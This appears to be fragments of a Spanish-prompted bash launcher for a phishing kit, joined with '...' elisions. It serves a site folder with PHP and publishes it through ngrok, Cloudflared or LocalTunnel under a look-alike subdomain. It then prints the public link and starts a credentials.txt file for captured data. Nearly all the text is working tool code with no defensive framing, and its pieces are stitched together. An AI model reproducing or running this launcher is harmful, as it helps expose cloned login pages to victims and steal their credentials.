...
website=$my_var3
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngrese el Host:\e[0m""\e[1;31m]\e[0m" 
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_va1
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngrese el Puerto:\e[0m""\e[1;31m]\e[0m" 
...
printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
 xterm -hold -geometry 90x26+1000+1000 -l -lf xtermtunnel -T "LocalTunnel server ☣" -e "ngrok http --region us "$HOST":"$PORT" " > /dev/null 2>&1 & 
sleep 10
printf "${BGreen}OK.${clear}\n\n"
printf "${BYellow}Your URL is: ${BGreen} "&& cat xtermtunnel | curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(ngrok-free.app)'
printf "\n"
sleep 2
printf "Website: $my_var3 \n\n" > credentials.txt
...
start_cloudflared() { 
    rm .server/.server/.cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.server/.cld.log > /dev/null 2>&1 &
	fi
	...
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.server/.cld.log")
...
cd $site && xterm -geometry 90x26+1000 -hold -T "PHP server" -e "php -S localhost:8000" > /dev/null 2>&1 &
sleep 5
printf "${BGreen}OK.${clear}\n"
printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
 xterm -hold -geometry 90x26+1000+1000 -l -lf xtermtunnel -T "LocalTunnel server ☣" -e "lt --port 8000 --subdomain $site-com --print-requests" > /dev/null 2>&1 & 
sleep 10
printf "${BGreen}OK.${clear}\n\n"
